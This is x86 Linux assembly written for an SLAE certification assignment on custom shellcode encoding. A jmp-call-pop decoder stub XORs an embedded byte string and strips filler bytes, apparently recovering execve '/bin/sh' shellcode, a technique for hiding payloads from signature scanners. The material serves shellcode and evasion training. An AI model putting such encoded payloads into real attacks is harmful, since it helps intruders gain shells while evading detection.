;Author: Aaron Weathersby
;SLAE #1488
;Handle: t0b0x0r
;github:https://github.com/t0b0rX0r/slae/upload/master/assignment4
;Assignment #4- Custom Encoding Scheme
;created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

global _start

section .text
_start:
	jmp short call_decoder


decode:
	pop esi  ; save address of encoded 
	xor edi,edi ; new
	xor eax,eax
	mov al, 1
	xor ebx, ebx

reverseAdd:
	xor edx,edx
	xor ebx,ebx
	mov bl,byte [esi+eax]
	
	mov byte dl,byte [esi+eax-1]
	xor dl,5
	
	mov byte [esi+eax-1],byte dl
	cmp eax,0x32 ;62 in hex...shellcode size before second function
	jge short predecoder
	
	
	inc edi
	add eax,2
	jmp short reverseAdd

	;Reset for removal of insertion
predecoder:
	lea edi, [esi+1]
	xor ebx,ebx
	
	xor eax,eax
	mov al,1
	
decoder:
	; Decode 
	mov bl, byte [esi+eax]
	xor edx,edx
	
	xor bl ,0x90
	jnz short encoded
	mov bl, byte[esi+eax+1]
	mov [edi], bl
	inc edi
	add al,2
	jmp short decoder
	

call_decoder:
	call decode
	encoded: db 0x34,0x90,0xc5,0x90,0x55,0x90,0x6d,0x90,0x2a,0x90,0x2a,0x90,0x76,0x90,0x6d,0x90,0x6d,0x90,0x2a,0x90,0x67,0x90,0x6c,0x90,0x6b,0x90,0x8c,0x90,0xe6,0x90,0x55,0x90,0x8c,0x90,0xe7,0x90,0x56,0x90,0x8c,0x90,0xe4,0x90,0xb5,0x90,0x0e,0x90,0xc8,0x90,0x85,0x90 

